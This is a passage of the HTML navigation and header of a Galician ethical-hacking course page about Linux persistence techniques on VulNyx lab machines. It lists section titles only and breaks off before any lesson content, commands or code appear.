@@ -1,0 +1,2931 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../indice_vulnyx_low_linux_fases/">
+      
+      
+        <link rel="next" href="../indice_vulnyx_low_windows_fases/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>Máquinas VulNyx - Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#fase-5-persistencia-maquinas-vulnyx-low-linux" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-header__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Máquinas VulNyx
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../apuntamentos/consideracions/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../doc-vulnyx-pivoting-war-basic/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD3
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-nav__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    De interese
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Apuntamentos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Apuntamentos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/consideracions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Consideracións
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tips
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tips
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tips/proxychains_pivoting_doc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proxychains e SOCKS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    GNU/Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            GNU/Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/restauracion-tty-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TTY non interactiva
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tips/rlwrap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    rlwrap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tips/uids-syscalls-wrappers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    UIDs, Syscalls e Wrappers de Persistencia
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tips/referencias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Referencias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tips/ataques-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ataques Kerberos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tips/desactivar-windows-defender/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Desactivar Windows Defender
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tips/powershell_bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Powershell Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tips/nishang/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nishang
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller UD3
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD3
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../doc-vulnyx-pivoting-war-basic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows / Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../doc-vulnyx-pivoting-basic-war/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux / Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulNyx
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            VulNyx
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_1" id="__nav_3_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../indice_vulnyx_low_linux_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Máquinas VulNyx
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas VulNyx
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-introducion-e-preparacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Introdución e Preparación
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Introdución e Preparación">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#obxectivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obxectivo
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pasos-basicos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pasos básicos
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fases-dun-test-de-intrusion-pentest" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fases dun test de intrusión (Pentest)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-bloque-i-persistencia-en-conexions-e-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Bloque I: Persistencia en Conexións e Shells
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Bloque I: Persistencia en Conexións e Shells">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-1-reverse-shell-simple-etcprofile" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 1: Reverse shell simple (/etc/profile)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-2-clave-ssh-persistente" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 2 - Clave SSH persistente
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-bloque-ii-persistencia-en-usuarios-e-credenciais" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Bloque II: Persistencia en Usuarios e Credenciais
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Bloque II: Persistencia en Usuarios e Credenciais">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-3-engadir-usuario-permanente-e-ademais-facelo-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 3 - Engadir usuario permanente e ademais facelo root
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-4-modificacion-de-arquivo-etcpasswd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 4 - Modificación de arquivo /etc/passwd
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-5-privilexios-sudo-sen-contrasinal-visudo-nopasswd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 5 - Privilexios sudo sen contrasinal (visudo NOPASSWD)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-bloque-iii-automatizacion-e-eventos-triggers" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Bloque III: Automatización e Eventos (Triggers)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Bloque III: Automatización e Eventos (Triggers)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-6-tarefa-programada-cron-job" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 6 - Tarefa programada (Cron Job)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-7-backdoor-en-servizo-systemd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 7 - Backdoor en servizo systemd
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-bloque-iv-persistencia-en-binarios-e-entorno" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Bloque IV: Persistencia en Binarios e Entorno
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Bloque IV: Persistencia en Binarios e Entorno">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-8-modificacion-do-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 8 - Modificación do PATH
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-9-biblioteca-compartida-maliciosa-ld_preload-estabilizada" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 9 - Biblioteca compartida maliciosa (LD_PRELOAD) - Estabilizada
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-10-capabilities-en-binarios-metodo-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 10 - Capabilities en binarios (Método Python)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-11-binario-suid-malicioso-wrapper-estatico" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 11 - Binario SUID malicioso (Wrapper Estático)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-12-binario-sgid-malicioso-wrapper-estatico" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 12 - Binario SGID malicioso (Wrapper Estático)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusión
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_2" id="__nav_3_2_2_2_label" tabindex="0">
+            
+  
+  
